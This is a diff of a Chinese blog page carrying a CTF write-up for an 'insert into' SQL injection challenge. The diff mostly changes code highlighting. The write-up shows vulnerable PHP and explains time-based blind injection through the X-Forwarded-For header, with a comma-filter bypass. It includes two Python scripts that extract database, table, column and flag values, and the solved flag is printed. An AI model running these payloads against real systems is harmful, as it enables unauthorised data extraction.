@@ -297,7 +297,7 @@
 	更新于
 	<a href="/2018/11/23/insert-into-注入/" itemprop="url">
 		<time datetime="2018-11-23T07:56:47.000Z" itemprop="dateUpdated">
-	  		2019-04-03
+	  		2019-04-05
 	  </time>
 	</a> 	
 
@@ -335,94 +335,101 @@
 
 	<div class="article-content" id="article-content">
 		<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目连接：<a href="http://123.206.87.240:8002/web15/" target="_blank" rel="noopener">http://123.206.87.240:8002/web15/</a><br>题目提示：</p>
-<pre><code>flag格式：flag{xxxxxxxxxxxx}
+<pre class="line-numbers language-python"><code class="language-python">flag格式：flag<span class="token punctuation">{</span>xxxxxxxxxxxx<span class="token punctuation">}</span>
 不如写个Python吧
 
-error_reporting(0);
+error_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-function getIp(){
-$ip = &#39;&#39;;
-if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
-$ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
-}else{
-$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
-}
-$ip_arr = explode(&#39;,&#39;, $ip);
-return $ip_arr[0];
+function getIp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+$ip <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_SERVER<span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+$ip <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+$ip <span class="token operator">=</span> $_SERVER<span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+$ip_arr <span class="token operator">=</span> explode<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> $ip<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span> $ip_arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-}
+<span class="token punctuation">}</span>
 
-$host=&quot;localhost&quot;;
-$user=&quot;&quot;;
-$pass=&quot;&quot;;
-$db=&quot;&quot;;
+$host<span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">;</span>
+$user<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+$<span class="token keyword">pass</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+$db<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
 
-$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);
+$connect <span class="token operator">=</span> mysql_connect<span class="token punctuation">(</span>$host<span class="token punctuation">,</span> $user<span class="token punctuation">,</span> $<span class="token keyword">pass</span><span class="token punctuation">)</span> <span class="token operator">or</span> die<span class="token punctuation">(</span><span class="token string">"Unable to connect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-mysql_select_db($db) or die(&quot;Unable to select database&quot;);
+mysql_select_db<span class="token punctuation">(</span>$db<span class="token punctuation">)</span> <span class="token operator">or</span> die<span class="token punctuation">(</span><span class="token string">"Unable to select database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-$ip = getIp();
-echo &#39;your ip is :&#39;.$ip;
-$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
-mysql_query($sql);
+$ip <span class="token operator">=</span> getIp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+echo <span class="token string">'your ip is :'</span><span class="token punctuation">.</span>$ip<span class="token punctuation">;</span>
+$sql<span class="token operator">=</span><span class="token string">"insert into client_ip (ip) values ('$ip')"</span><span class="token punctuation">;</span>
+mysql_query<span class="token punctuation">(</span>$sql<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-</code></pre><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>分析代码发现执行$sql语句。而我们可以通过改变X-Forwarded-For来改变我们的ip，代码中的getip()函数把我们传入的ip进行了逗号过滤。然后，我们来尝试注入，因为error_reporting(0);屏蔽啦报错信息。所以不考虑报错注入。因为没有回显所以只能用延时盲注。</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>分析代码发现执行$sql语句。而我们可以通过改变X-Forwarded-For来改变我们的ip，代码中的getip()函数把我们传入的ip进行了逗号过滤。然后，我们来尝试注入，因为error_reporting(0);屏蔽啦报错信息。所以不考虑报错注入。因为没有回显所以只能用延时盲注。</p>
 <p>延时盲注，我们经常用到的if(condition,Expression1,Expression2) condition为真执行Expression1。为假执行Expression2。就不能使用了。我们要用到</p>
-<pre><code>case when exp1 then sleep(4) else 1 end
-</code></pre><p>来绕过 “,”的限制。</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">case when exp1 then sleep(4) else 1 end
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>来绕过 “,”的限制。</p>
 <p>substr($str,1,1)也需要改变变成</p>
-<pre><code>substr($str)  from 1 for 1
-</code></pre><p>来绕过”,”的过滤。<br>所以我用来注入的语句就是：</p>
-<pre><code>11&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) #
+<pre class="line-numbers language-mysql"><code class="language-mysql">substr($str)  from 1 for 1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>来绕过”,”的过滤。<br>所以我用来注入的语句就是：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">11' and (case when (length((select database())) = 14) then sleep(4) else 1 end) #
 
-11&#39; and (case when (substr(select database())  from 1 for 1)=&#39;c&#39; then sleep(4) else 1 end) # 
-</code></pre><p>构造成的完整语句为：</p>
-<pre><code>insert into client_ip (ip) values (&#39;11&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) # &#39;)
+11' and (case when (substr(select database())  from 1 for 1)='c' then sleep(4) else 1 end) # 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>构造成的完整语句为：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">insert into client_ip (ip) values ('11' and (case when (length((select database())) = 14) then sleep(4) else 1 end) # ')
 //获得长度
-insert into client_ip (ip) values (&#39;11&#39; and (case when (substr(select database())  from 1 for 1)=&#39;c&#39; then sleep(4) else 1 end) #&#39;)
+insert into client_ip (ip) values ('11' and (case when (substr(select database())  from 1 for 1)='c' then sleep(4) else 1 end) #')
 //获得内容
-</code></pre><p>经过我本机测试发现values里面and前面单引号里面的值只能是数字，不能是字母或符号，当时字母或符号的时候，语句会执行。但是and后面的语句不会执行。执行后插入表中的值为0。所以不能产生延时。所以那里的只能是数字。<br>最后附上菜鸡的小脚本：</p>
-<pre><code>#用来获取长度
-# coding=utf-8
-import requests
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过我本机测试发现values里面and前面单引号里面的值只能是数字，不能是字母或符号，当时字母或符号的时候，语句会执行。但是and后面的语句不会执行。执行后插入表中的值为0。所以不能产生延时。所以那里的只能是数字。<br>最后附上菜鸡的小脚本：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#用来获取长度</span>
+<span class="token comment" spellcheck="true"># coding=utf-8</span>
+<span class="token keyword">import</span> requests
 
-flag=&quot;&quot;
-url=&#39;http://123.206.87.240:8002/web15/&#39;
-for i in range(0,100):
-    # data=&quot;11&#39; and (case when (length((select database())) = &quot;+str(i)+&quot;) then sleep(4) else 1 end )) #&quot; #数据库名的长的为5
-    # data=&quot;11&#39; and (case when (length((select group_concat(table_name) from information_schema.tables where table_schema=database() )) = &quot;+str(i)+&quot;) then sleep(4) else 1 end )) #&quot; #web15下的全部表名加，分割符共14个字符
-    # data = &quot;11&#39;  and (case when (length((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;))=&quot;+str(i)+&quot;) then sleep(4) else 1 end)) #&quot; #flag表下列名长度为4
-    data = &quot;11&#39;  and (case when (length((select flag from flag))=&quot;+str(i)+&quot;) then sleep(4) else 1 end)) #&quot;#flag表里的内容长度为32
-    header={&#39;X-Forwarded-For&#39;:data}
-    try:
-        res=requests.get(url,headers=header,timeout=3)
-        # print res.text
-    except requests.exceptions.ReadTimeout:
-        length=i
-        print length
+flag<span class="token operator">=</span><span class="token string">""</span>
+url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment" spellcheck="true"># data="11' and (case when (length((select database())) = "+str(i)+") then sleep(4) else 1 end )) #" #数据库名的长的为5</span>
+    <span class="token comment" spellcheck="true"># data="11' and (case when (length((select group_concat(table_name) from information_schema.tables where table_schema=database() )) = "+str(i)+") then sleep(4) else 1 end )) #" #web15下的全部表名加，分割符共14个字符</span>
+    <span class="token comment" spellcheck="true"># data = "11'  and (case when (length((select group_concat(column_name) from information_schema.columns where table_name='flag'))="+str(i)+") then sleep(4) else 1 end)) #" #flag表下列名长度为4</span>
+    data <span class="token operator">=</span> <span class="token string">"11'  and (case when (length((select flag from flag))="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">") then sleep(4) else 1 end)) #"</span>#flag表里的内容长度为<span class="token number">32</span>
+    header<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span>data<span class="token punctuation">}</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># print res.text</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>
+        length<span class="token operator">=</span>i
+        <span class="token keyword">print</span> length
 
-</code></pre><pre><code>#用来获取内容
-# coding=utf-8
-import requests
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#用来获取内容</span>
+<span class="token comment" spellcheck="true"># coding=utf-8</span>
+<span class="token keyword">import</span> requests
 
-flag=&quot;&quot;
-url=&#39;http://123.206.87.240:8002/web15/&#39;
-for b in range(1,33):
-    for i in range(0,73):
-        a=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*.&quot;
-        # data=&quot;11&#39; and (case when (substr((select database()) from &quot;+str(b)+&quot; for 1) = &#39;&quot;+a[i]+&quot;&#39;) then sleep(5) else 1 end )) #&quot; #数据库名：web15
-        # data=&quot;11&#39; and (select binary case when (substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) from &quot;+str(b)+&quot; for 1) = &#39;&quot;+a[i]+&quot;&#39;) then sleep(5) else 1 end )) #&quot;# web15下的表有client_ip,flag
-        # data= &quot;11&#39; and (case when (substr((select binary group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &quot; + str(b) + &quot; for 1 )=&#39;&quot; + a[i] + &quot;&#39;) then sleep(4) else 1 end )) #&quot; # flag表下列名flag
-        data=&quot;11&#39; and (case when (substr((select binary flag from flag) from &quot; + str(b) + &quot; for 1 )=&#39;&quot; + a[i] + &quot;&#39;) then sleep(4) else 1 end )) #&quot;#flag{cdbf14c9551d5be5612f7bb5d2867853}
-        header={&#39;X-Forwarded-For&#39;:data}
-        try:
-            res=requests.get(url,headers=header,timeout=4)
-            # print res.text
-        except requests.exceptions.ReadTimeout:
-            flag+=a[i]
-            print flag
+flag<span class="token operator">=</span><span class="token string">""</span>
+url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
+<span class="token keyword">for</span> b <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        a<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,_!@#$%^&amp;*."</span>
+        <span class="token comment" spellcheck="true"># data="11' and (case when (substr((select database()) from "+str(b)+" for 1) = '"+a[i]+"') then sleep(5) else 1 end )) #" #数据库名：web15</span>
+        <span class="token comment" spellcheck="true"># data="11' and (select binary case when (substr((select binary group_concat(table_name) from information_schema.tables where table_schema=database()) from "+str(b)+" for 1) = '"+a[i]+"') then sleep(5) else 1 end )) #"# web15下的表有client_ip,flag</span>
+        <span class="token comment" spellcheck="true"># data= "11' and (case when (substr((select binary group_concat(column_name) from information_schema.columns where table_name='flag') from " + str(b) + " for 1 )='" + a[i] + "') then sleep(4) else 1 end )) #" # flag表下列名flag</span>
+        data<span class="token operator">=</span><span class="token string">"11' and (case when (substr((select binary flag from flag) from "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" for 1 )='"</span> <span class="token operator">+</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"') then sleep(4) else 1 end )) #"</span>#flag<span class="token punctuation">{</span>cdbf14c9551d5be5612f7bb5d2867853<span class="token punctuation">}</span>
+        header<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'X-Forwarded-For'</span><span class="token punctuation">:</span>data<span class="token punctuation">}</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>
+            <span class="token comment" spellcheck="true"># print res.text</span>
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span>
+            flag<span class="token operator">+=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
+            <span class="token keyword">print</span> flag
 
-</code></pre><p>在注表名的时候 “,”因为是被过滤了的，所以脚本跑出来两个表之间的“,”是被过滤了，但是看单词也能把它区分开。</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在注表名的时候 “,”因为是被过滤了的，所以脚本跑出来两个表之间的“,”是被过滤了，但是看单词也能把它区分开。</p>
 <p>最后，只能说博大精深。需要学的东西还有很多。加油小伙子。</p>
 	
 	</div>
@@ -525,6 +532,7 @@ c:\wind...
 						</a>
 						<p>
 							知识储备strcmp()函数int strcmp ( string $str1 , string $str2 )
+
 说明
 注意该比较区分大小写。
 参数
@@ -533,7 +541,7 @@ str1
 str2
 第二个字符串。
 返回值
-strcmp二进制安全字...
+strcmp二进制安全...
 						</p>
 					</div>
 
@@ -591,7 +599,7 @@ ctf题与真正的漏洞有差距。需要换种思维来考虑问题。
 							首先，护网杯对新手不友好。看题看到绝望！！！全程懵逼状态。好啦不吐槽啦。。。。
 进入正题：迟来的签到题
 首先从文件下载下来看着像base64.但通过base64解码工具解码出来
-    V_UPVSUSUQR^W_###QV&#...
+    V_UPVSUSUQR^W_###QV'R...
 						</p>
 					</div>
 
